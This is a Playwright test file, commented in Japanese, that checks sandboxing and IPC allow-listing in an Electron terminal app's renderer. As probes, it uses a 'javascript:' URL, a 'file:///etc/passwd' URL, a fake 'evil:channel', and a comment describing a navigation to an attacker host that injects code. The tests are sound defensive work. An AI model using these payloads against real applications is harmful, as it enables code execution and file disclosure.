const { test, expect } = require('@playwright/test');
// 起動〜初期描画待ちは共通ヘルパーへ集約している（issue #263）。
const { closeApp, getFreePort, launchAppAndWait } = require('./helpers/electron-app');

// ─── renderer の隔離（issue #268） ────────────────────────────────────────────
//
// このアプリの表示処理は、PTY 出力・HTTP API 入力・orchestrator の宣言ファイルという
// 外部由来の文字列を大量に描画する。どこか 1 箇所でエスケープが漏れても任意コード実行
// （require('child_process') 等）に至らないよう、renderer は nodeIntegration: false /
// contextIsolation: true で動かし、preload が許可リストで絞った API だけを渡している。
//
// この spec は「その隔離が効いていること」自体を回帰テストとして固定する。
// nodeIntegration を戻す・許可リストを汎用 invoke に置き換える、といった変更が入ると
// ここが落ちる。個々の機能テストは隔離が外れても素通りしてしまうため、専用に持つ。
test.describe.serial('renderer の隔離（issue #268）', () => {
  let app;
  let win;
  let tmpRoot;

  test.beforeAll(async () => {
    const port = await getFreePort();
    ({ app, win, tmpRoot } = await launchAppAndWait({
      port,
      prefix: 'vk-terminals-e2e-isolation-',
    }));
  });

  test.afterAll(async () => {
    await closeApp({ app, tmpRoot });
  });

  test('renderer から Node / Electron へ直接到達できない', async () => {
    const reachable = await win.evaluate(() => ({
      require: typeof window.require,
      module: typeof window.module,
      process: typeof window.process,
      Buffer: typeof window.Buffer,
      global: typeof window.global,
      // contextIsolation が効いていれば preload の変数も見えない。
      ipcRenderer: typeof window.ipcRenderer,
    }));
    expect(reachable).toEqual({
      require: 'undefined',
      module: 'undefined',
      process: 'undefined',
      Buffer: 'undefined',
      global: 'undefined',
      ipcRenderer: 'undefined',
    });
  });

  // この PR（issue #323）の主目的そのものの回帰チェック。上の 2 テストは preload が
  // 見せる API の形と IPC の疎通しか確かめておらず、renderer が nodeIntegration: false /
  // contextIsolation: true で保護されていても、main.js の webPreferences に
  // sandbox: false を書き戻すだけで OS レベルのサンドボックスは無効化できてしまう
  // （それでも他のテストは緑のまま通る）。ここでは実際に起動した webContents の
  // webPreferences を直接読み、sandbox が有効なままであることを固定する。
  test('renderer の webContents は OS レベルのサンドボックス（sandbox: true）で動いている', async () => {
    const sandboxed = await app.evaluate(({ BrowserWindow }) => {
      const target = BrowserWindow.getAllWindows()[0];
      return target.webContents.getLastWebPreferences().sandbox;
    });
    expect(sandboxed).toBe(true);
  });

  test('preload が渡すのは名前を付けた API だけで、生の ipcRenderer は渡らない', async () => {
    const shape = await win.evaluate(() => ({
      bridgeKeys: Object.keys(window.vkBridge).sort(),
      ipcKeys: Object.keys(window.vkBridge.ipc).sort(),
      shellKeys: Object.keys(window.vkBridge.shell).sort(),
      clipboardKeys: Object.keys(window.vkBridge.clipboard).sort(),
      // 生の ipcRenderer が漏れていれば sendSync / postMessage などが生えている。
      hasSendSync: typeof window.vkBridge.ipc.sendSync,
      hasPostMessage: typeof window.vkBridge.ipc.postMessage,
    }));
    expect(shape.bridgeKeys).toEqual(['agentRoomSprites', 'clipboard', 'ipc', 'shell', 'xterm']);
    // 解除は on() の戻り値の unsubscribe だけ。off(channel, listener) は contextBridge 越しに
    // 関数の同一性が保てず成立しないので公開しない（preload.js の addListener を参照）。
    expect(shape.ipcKeys).toEqual(['invoke', 'on', 'send']);
    expect(shape.shellKeys).toEqual(['beep', 'openExternal']);
    expect(shape.clipboardKeys).toEqual(['writeText']);
    expect(shape.hasSendSync).toBe('undefined');
    expect(shape.hasPostMessage).toBe('undefined');
  });

  test('許可リストに無いチャンネルは invoke / send / on のいずれでも拒否される', async () => {
    const results = await win.evaluate(async () => {
      const out = {};
      // 実在するが renderer からは呼ばせないチャンネル（main が shell を実行するもの）。
      out.invokeDenied = await window.vkBridge.ipc.invoke('shell:open-external', 'https://example.com/')
        .then(() => 'NOT REJECTED', (e) => String(e.message));
      // 存在しないチャンネルも同じく弾く。
      out.invokeUnknown = await window.vkBridge.ipc.invoke('evil:channel')
        .then(() => 'NOT REJECTED', (e) => String(e.message));
      try {
        window.vkBridge.ipc.send('evil:channel');
        out.sendDenied = 'NOT REJECTED';
      } catch (e) { out.sendDenied = String(e.message); }
      try {
        window.vkBridge.ipc.on('evil:channel', () => {});
        out.onDenied = 'NOT REJECTED';
      } catch (e) { out.onDenied = String(e.message); }
      return out;
    });
    expect(results.invokeDenied).toContain('invoke channel not allowed');
    expect(results.invokeUnknown).toContain('invoke channel not allowed');
    expect(results.sendDenied).toContain('send channel not allowed');
    expect(results.onDenied).toContain('on channel not allowed');
  });

  test('main → renderer のリスナーには event（webContents 経由の抜け道）を渡さず、解除もできる', async () => {
    // 許可済みチャンネルへリスナーを張り、受け取った引数を window に記録する。
    // 1 回受け取ったら on() の戻り値（unsubscribe）で自分を解除する。
    await win.evaluate(() => {
      window.__menuCalls = [];
      const off = window.vkBridge.ipc.on('menu:update', (...args) => {
        window.__menuCalls.push({
          count: args.length,
          firstIsArray: Array.isArray(args[0]),
          // event が渡っていれば第 1 引数はオブジェクトで sender を持つ。
          hasSender: !!(args[0] && typeof args[0] === 'object' && 'sender' in args[0]),
        });
        off();
      });
    });

    // menu:update は main の pushMenuUpdate() がセクション配列を 1 つだけ送る。
    // 2 回送り、解除後の 2 通目が届かないことまで確かめる。
    await app.evaluate(({ BrowserWindow }) => {
      const target = BrowserWindow.getAllWindows()[0];
      target.webContents.send('menu:update', []);
      target.webContents.send('menu:update', []);
    });

    await expect
      .poll(() => win.evaluate(() => window.__menuCalls.length), { timeout: 5000 })
      .toBe(1);
    expect(await win.evaluate(() => window.__menuCalls[0]))
      .toEqual({ count: 1, firstIsArray: true, hasSender: false });
    // 解除が効いていれば、この後さらに送っても増えない。
    await app.evaluate(({ BrowserWindow }) => {
      BrowserWindow.getAllWindows()[0].webContents.send('menu:update', []);
    });
    await win.waitForTimeout(300);
    expect(await win.evaluate(() => window.__menuCalls.length)).toBe(1);
    await win.evaluate(() => { delete window.__menuCalls; });
  });

  test('openExternal は http(s) 以外を開かない（renderer 側・main 側の二段）', async () => {
    // main 側の shell.openExternal を差し替え、実際に何が渡ったかを記録する。
    await app.evaluate(({ shell }) => {
      globalThis.__origOpenExternal = shell.openExternal;
      globalThis.__opened = [];
      shell.openExternal = async (url) => { globalThis.__opened.push(url); };
    });
    try {
      const returned = await win.evaluate(async () => ({
        https: await window.VKShell.openExternal('https://example.com/'),
        javascript: await window.VKShell.openExternal('javascript:alert(1)'),
        file: await window.VKShell.openExternal('file:///etc/passwd'),
        notString: await window.VKShell.openExternal({ toString: () => 'https://example.com/' }),
      }));
      expect(returned).toEqual({ https: true, javascript: false, file: false, notString: false });
      // main まで届いたのは http(s) の 1 件だけ。
      expect(await app.evaluate(() => globalThis.__opened)).toEqual(['https://example.com/']);
    } finally {
      await app.evaluate(({ shell }) => {
        shell.openExternal = globalThis.__origOpenExternal;
        delete globalThis.__origOpenExternal;
        delete globalThis.__opened;
      });
    }
  });

  test('clipboard.writeText は文字列と長さを検証する', async () => {
    await app.evaluate(({ clipboard }) => {
      globalThis.__origWriteText = clipboard.writeText;
      globalThis.__written = [];
      clipboard.writeText = (text) => { globalThis.__written.push(text); };
    });
    try {
      const returned = await win.evaluate(async () => ({
        ok: await window.VKClipboard.writeText('vk-terminals'),
        empty: await window.VKClipboard.writeText(''),
        // 上限（10 万文字）超過は渡さない。
        tooLong: await window.VKClipboard.writeText('x'.repeat(100001)),
        notString: await window.VKClipboard.writeText(12345),
      }));
      expect(returned).toEqual({ ok: true, empty: false, tooLong: false, notString: false });
      expect(await app.evaluate(() => globalThis.__written)).toEqual(['vk-terminals']);
    } finally {
      await app.evaluate(({ clipboard }) => {
        clipboard.writeText = globalThis.__origWriteText;
        delete globalThis.__origWriteText;
        delete globalThis.__written;
      });
    }
  });

  test('renderer から外部オリジンへ遷移できない・新規ウィンドウも開けない', async () => {
    // preload は BrowserWindow ではなく webContents の属性なので、この webContents が
    // 読み込むあらゆるドキュメントで動く。遷移を許すと、renderer にスクリプト実行を
    // 許してしまった時点で location.href = 'https://attacker.example/' の 1 行で
    // 攻撃者のオリジンのページに vkBridge が生え、攻撃者のサーバから任意のコードを
    // 継続的に流し込める状態になる。main.js の will-navigate / setWindowOpenHandler で
    // 塞いでいるので、外されたらここで落ちる。
    const before = await win.evaluate(() => location.href);
    expect(before).toContain('renderer/index.html');

    const result = await win.evaluate(() => {
      const out = {};
      try {
        location.href = 'https://example.com/';
        out.assignError = null;
      } catch (e) { out.assignError = String(e.message); }
      try {
        // 新規ウィンドウも同様に拒否される（deny なので戻り値は null）。
        out.openedWindow = window.open('https://example.com/', '_blank') === null ? 'null' : 'window';
      } catch (e) { out.openedWindow = 'threw: ' + String(e.message); }
      return out;
    });
    expect(result.openedWindow).toBe('null');

    // 遷移が起きていれば href が変わり、preload の bridge も貼り直される。
    // 猶予を置いてから、元のドキュメントのままであることを確かめる。
    await win.waitForTimeout(1000);
    expect(await win.evaluate(() => location.href)).toBe(before);
    // 外部リンクを開く導線は shell.openExternal 側に残っている（塞いだのは遷移だけ）。
    expect(await win.evaluate(() => typeof window.VKShell.openExternal)).toBe('function');
  });

  test('xterm と xterm.css は main が解決した実体を preload 経由で受け取って読み込まれている', async () => {
    const loaded = await win.evaluate(async () => {
      // preload は自分でファイルを読まず、main へ invoke で問い合わせるだけになった
      // （issue #323）。xterm.scriptUrls / xterm.css のような静的プロパティは
      // vkBridge にもう存在せず、getResources() という関数だけが公開されている。
      const xtermBridgeShape = {
        hasStaticScriptUrls: 'scriptUrls' in window.vkBridge.xterm,
        hasStaticCss: 'css' in window.vkBridge.xterm,
        getResourcesType: typeof window.vkBridge.xterm.getResources,
      };
      // 実際に main へ invoke して、file:// URL 2 本と xterm.css の中身が返ってくること
      // （main.js の ipcMain.handle('app:get-xterm-resources') が生きていること）を確かめる。
      const resources = await window.vkBridge.xterm.getResources();

      return {
        xtermBridgeShape,
        scriptUrlCount: resources.scriptUrls.length,
        scriptUrlsAreFileUrls: resources.scriptUrls.every((u) => u.startsWith('file://')),
        cssLength: resources.css.length,
        terminal: typeof window.Terminal,
        fitAddon: typeof (window.FitAddon && window.FitAddon.FitAddon),
        // xterm.css が <style> として入っていること。IME 用 textarea を画面外へ逃がす
        // スタイルが欠けると、日本語入力の変換候補がペイン左上に出る（issue #268 以前からの要件）。
        hasHelperTextareaRule: Array.from(document.querySelectorAll('style'))
          .some((el) => el.textContent.includes('.xterm-helper-textarea')),
        // アプリ側 style.css より前に入っていること（後勝ちの上書き関係を維持する）。
        injectedBeforeAppCss: (() => {
          const children = Array.from(document.head.children);
          const styleIndex = children.findIndex(
            (el) => el.tagName === 'STYLE' && el.textContent.includes('.xterm-helper-textarea')
          );
          const linkIndex = children.findIndex(
            (el) => el.tagName === 'LINK' && el.getAttribute('href') === 'style.css'
          );
          return styleIndex > -1 && linkIndex > -1 && styleIndex < linkIndex;
        })(),
        // 実際に適用され、IME 用 textarea が文書フローから外れていること。
        helperTextarea: (() => {
          const el = document.querySelector('.xterm-helper-textarea');
          if (!el) return null;
          const style = getComputedStyle(el);
          return { position: style.position, opacity: style.opacity };
        })(),
      };
    });
    expect(loaded.xtermBridgeShape).toEqual({
      hasStaticScriptUrls: false,
      hasStaticCss: false,
      getResourcesType: 'function',
    });
    expect(loaded.scriptUrlCount).toBe(2);
    expect(loaded.scriptUrlsAreFileUrls).toBe(true);
    expect(loaded.cssLength).toBeGreaterThan(0);
    expect(loaded.terminal).toBe('function');
    expect(loaded.fitAddon).toBe('function');
    expect(loaded.hasHelperTextareaRule).toBe(true);
    expect(loaded.injectedBeforeAppCss).toBe(true);
    expect(loaded.helperTextarea).toEqual({ position: 'absolute', opacity: '0' });
  });

  test('エージェントルームのスプライトは main へ invoke して受け取っている（issue #323）', async () => {
    const result = await win.evaluate(async () => {
      const hasStaticSprites = typeof window.vkBridge.agentRoomSprites !== 'object'
        ? null
        : Object.keys(window.vkBridge.agentRoomSprites).filter((k) => k !== 'get');
      const sprites = await window.vkBridge.agentRoomSprites.get();
      return {
        getType: typeof window.vkBridge.agentRoomSprites.get,
        // get() 以外の静的プロパティ（旧: ファイル名 → SVG のマップ本体）が残っていないこと。
        extraKeys: hasStaticSprites,
        spriteFileCount: Object.keys(sprites || {}).length,
        // bootstrap.js が app.js 読み込み前に window へ配置したもの（renderer/agentRoom.js が参照）。
        windowSpriteFileCount: Object.keys(window.VKAgentRoomSprites || {}).length,
      };
    });
    expect(result.getType).toBe('function');
    expect(result.extraKeys).toEqual([]);
    expect(result.spriteFileCount).toBeGreaterThan(0);
    expect(result.windowSpriteFileCount).toBe(result.spriteFileCount);
  });
});

// ─── 起動に失敗したときの見え方 ───────────────────────────────────────────────
//
// renderer/bootstrap.js は「xterm を読み込んでから app.js を読み込む」順序を作る場所で、
// ここで失敗すると画面はダーク背景の titlebar と空の #root だけになる。☰ も ⚙ も
// 反応せず、ユーザーからは無言で固まったようにしか見えない（復旧手段はアプリの終了だけ）。
// console.error だけで済ませていないこと＝画面に理由が出ることを固定する。
//
// issue #326: boot() が失敗する 3 つの原因（実体の場所を解決できない／実体は
// 見つかったが読み込みに失敗／xterm.css が読めない）は、以前はすべて同じ 1 文に
// なっていた。ここでは 3 つの経路を個別に踏んで、それぞれ固定の文言へ振り分けられる
// ことを確認する。
//
// 上の describe.serial とは app を共有しない。再読み込みを挟むため、
// 共有インスタンスを壊さないよう専用に起動する。
test('script の実体は見つかるが読み込みに失敗したときは、その原因専用の文言を画面に出す', async () => {
  const port = await getFreePort();
  const launched = await launchAppAndWait({
    port,
    prefix: 'vk-terminals-e2e-boot-failure-load-',
  });
  try {
    // 正常に起動できていることを先に確かめる（この後の失敗が仕込みによるものだと分かる）。
    await expect(launched.win.locator('#sidebar')).toBeAttached();
    await expect(launched.win.locator('.boot-error')).toHaveCount(0);

    // xterm 本体の読み込みだけを落とす。main の require.resolve（app:get-xterm-resources）は
    // 成功させたまま <script> の取得を失敗させることで、loadScript が reject する経路
    // （bootstrap.js の BOOT_ERROR_CODE.SCRIPT_LOAD_FAILED）を通す。
    await launched.app.evaluate(({ session, BrowserWindow }) => {
      session.defaultSession.webRequest.onBeforeRequest(
        { urls: ['*://*/*', 'file://*', 'file:///*'] },
        (details, callback) => callback({ cancel: /xterm\.js(\?|$)/.test(details.url) })
      );
      BrowserWindow.getAllWindows()[0].webContents.reload();
    });

    // 画面に理由が出る。role="alert" で支援技術にも伝わる。
    const bootError = launched.win.locator('.boot-error');
    await expect(bootError).toBeVisible({ timeout: 30000 });
    await expect(bootError).toHaveAttribute('role', 'alert');
    // 次に取れる手を「まず再起動 → それでも駄目ならインストールし直す」の順で書く。
    // 全文で固定するのは、軽い手段（再起動）が条件節に埋もれて重い手段（再インストール）
    // だけが拾い読みで目に入る書き方へ戻るのを防ぐため。原因1（場所を特定できない）・
    // 原因3（css を読めない）とは 1 文目が異なることも、この全文一致で固定される。
    await expect(bootError).toHaveText(
      'ターミナルの描画に必要なファイルの読み込みに失敗しました。アプリを再起動してください。それでも直らない場合は、インストールし直してください。'
    );
    // 空の #root のまま放置されていない。
    await expect(launched.win.locator('#sidebar')).toHaveCount(0);
  } finally {
    await closeApp(launched);
  }
});

test('script の実体を解決できないときは、専用の文言を画面に出す', async () => {
  const port = await getFreePort();
  const launched = await launchAppAndWait({
    port,
    prefix: 'vk-terminals-e2e-boot-failure-resolve-',
  });
  try {
    await expect(launched.win.locator('#sidebar')).toBeAttached();
    await expect(launched.win.locator('.boot-error')).toHaveCount(0);

    // ipcMain.handle('app:get-xterm-resources') を差し替え、scriptUrls を 2 本未満に
    // する。main.js の resolveScriptUrl は require.resolve の失敗を握りつぶして
    // 空文字を返し filter(Boolean) で落とすため、renderer からは「1 本も無い」応答として
    // 見える（bootstrap.js の urls.length < 2 → BOOT_ERROR_CODE.RESOLVE_FAILED）。
    // 同じ手口を再現するため、ここではハンドラ自体を空配列を返すものに差し替える。
    await launched.app.evaluate(({ ipcMain }) => {
      ipcMain.removeHandler('app:get-xterm-resources');
      ipcMain.handle('app:get-xterm-resources', () => ({ scriptUrls: [], css: 'body{}' }));
    });
    await launched.app.evaluate(({ BrowserWindow }) => {
      BrowserWindow.getAllWindows()[0].webContents.reload();
    });

    const bootError = launched.win.locator('.boot-error');
    await expect(bootError).toBeVisible({ timeout: 30000 });
    await expect(bootError).toHaveAttribute('role', 'alert');
    await expect(bootError).toHaveText(
      'ターミナルの描画に必要なファイルの場所を特定できませんでした。アプリを再起動してください。それでも直らない場合は、インストールし直してください。'
    );
    await expect(launched.win.locator('#sidebar')).toHaveCount(0);
  } finally {
    await closeApp(launched);
  }
});

test('xterm.css を読み込めないときは、専用の文言を画面に出す', async () => {
  const port = await getFreePort();
  const launched = await launchAppAndWait({
    port,
    prefix: 'vk-terminals-e2e-boot-failure-css-',
  });
  try {
    await expect(launched.win.locator('#sidebar')).toBeAttached();
    await expect(launched.win.locator('.boot-error')).toHaveCount(0);

    // 差し替え前に、正規の scriptUrls（実在する file:// URL）を今動いている renderer から
    // 取得しておく。差し替え後も script 自体は正しく読み込ませたい（読み込みに失敗させる
    // テストは別にあるため）ので、css だけを空にして BOOT_ERROR_CODE.CSS_MISSING の経路を
    // 単独で通す。
    const realResources = await launched.win.evaluate(
      () => window.vkBridge.xterm.getResources()
    );
    await launched.app.evaluate(({ ipcMain }, resources) => {
      ipcMain.removeHandler('app:get-xterm-resources');
      ipcMain.handle('app:get-xterm-resources', () => ({
        scriptUrls: resources.scriptUrls,
        css: '',
      }));
    }, realResources);
    await launched.app.evaluate(({ BrowserWindow }) => {
      BrowserWindow.getAllWindows()[0].webContents.reload();
    });

    const bootError = launched.win.locator('.boot-error');
    await expect(bootError).toBeVisible({ timeout: 30000 });
    await expect(bootError).toHaveAttribute('role', 'alert');
    await expect(bootError).toHaveText(
      'ターミナルの表示スタイルを読み込めませんでした。アプリを再起動してください。それでも直らない場合は、インストールし直してください。'
    );
    await expect(launched.win.locator('#sidebar')).toHaveCount(0);
  } finally {
    await closeApp(launched);
  }
});
